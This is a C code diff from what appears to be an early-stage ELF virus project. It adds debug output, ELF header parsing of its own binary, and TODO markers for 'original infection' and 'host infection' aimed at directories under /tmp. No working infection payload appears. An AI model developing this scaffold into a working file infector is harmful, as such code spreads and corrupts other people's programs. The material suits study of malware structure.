@@ -5,6 +5,8 @@ int			check_file(void *addr)
 	Elf64_Ehdr		*header;
 	unsigned char	magic[EI_NIDENT];
 
+	if (DEBUG)
+		printf("%scheck_file%s()\n", _BLUE, _END);
 	header = addr;
 	memcpy(magic, addr, sizeof(magic));
 	if ((magic[EI_MAG0] == ELFMAG0) &&
@@ -25,6 +27,8 @@ void	moving_through_path(char *path)
 	int		size;
 	char	*new_path;
 
+	if (DEBUG)
+		printf("%smoving_through_path%s()\n", _BLUE, _END);
 	dir = opendir(path);
 	if (dir)
 	{
@@ -79,20 +83,42 @@ void	moving_through_path(char *path)
 int		main(int argc, char *argv[])
 {
 	int		fd;
-	int		size;
+	int		ret;
+	t_elf	elf;
 
-	(void)argc;
+	if (DEBUG)
+		printf("%smain%s()\n", _BLUE, _END);
+	if (DEBUG)
+		debug_print_args(argc, argv);
 	fd = open(argv[0], O_RDONLY);
 	if (fd > 0)
 	{
-		size = lseek(fd, (size_t)0, SEEK_END);
-		printf("size %d\n", size);
-		if (size == VIRUS_SIZE)
-			printf("ORIGINAL\n");
-		else
-			printf("HOST\n");
+		/* TODO: Original infection
+			Copy the whole file
+		*/
+		elf.size = lseek(fd, (size_t)0, SEEK_END);
+		if (elf.size < 0 ||
+(elf.addr = mmap(NULL, elf.size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+		{
+			close(fd);
+			if (DEBUG)
+				debug_print_error(0, argv[0], argv[0]);
+			return (1);
+		}
+		if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
+		{
+			close(fd);
+			if (DEBUG)
+				debug_print_error(ret, argv[0], argv[0]);
+		}
+		if (DEBUG)
+			debug_print_elf(&elf);
+		munmap(elf.addr, elf.size);
+		// TODO: Host infection
+		/*
 		moving_through_path("/tmp/test");
 		moving_through_path("/tmp/test2");
+		*/
 		close(fd);
 	}
 	return (0);
